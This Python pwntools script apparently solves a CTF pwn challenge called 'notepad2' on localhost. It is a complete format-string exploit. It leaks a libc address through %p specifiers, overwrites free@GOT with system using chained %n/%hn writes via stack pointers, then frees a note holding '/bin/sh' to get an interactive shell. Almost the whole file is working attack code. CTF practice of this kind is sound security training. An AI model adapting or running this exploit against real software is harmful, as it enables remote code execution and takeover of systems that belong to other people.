#!/usr/bin/env python3

# ruff: noqa: F403, F405


from pwn import *
from pwnlib import gdb

elf = context.binary = ELF("./notepad2_patched", checksec=False)
if elf.libc:
    libc = elf.libc
else:
    libc = ELF("./libc.so.6")
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc localhost 1341"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}
if len(env) == 0:
    env = None

gdbscript = """
"""


def create(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendlineafter(b"> ", data)


def view(idx: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())


def remove(idx: int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(idx).encode())


def exit_():
    io.sendlineafter(b"> ", b"4")


def printf_leak(offset: int):
    create(9, f"%{offset}$p".encode())
    view(9)
    leak = io.recvline().strip()
    remove(9)
    return leak


io = start()

# for i in range(1, 128):
#     log.info(f"{printf_leak(i)}")

libc.address = int(printf_leak(0xD), 16) - 0x28150
log.info(f"{libc.address=:#x}")

create(9, b"/bin/sh\x00")

free_got = elf.got["free"]

# use stack pointer (at offset 8), which points to stack address (at offset 12),
# to write free@GOT address and then overwrite free@GOT with system
for i in range(2):
    create(i * 2, f"%{free_got + 2*i}c%8$n".encode())
    view(i * 2)

    libc_system = libc.sym["system"]
    to_write = (libc_system >> (16 * i)) & 0xFFFF
    create(i * 2 + 1, f"%{to_write}c%12$hn".encode())
    view(i * 2 + 1)

remove(9)

io.interactive()
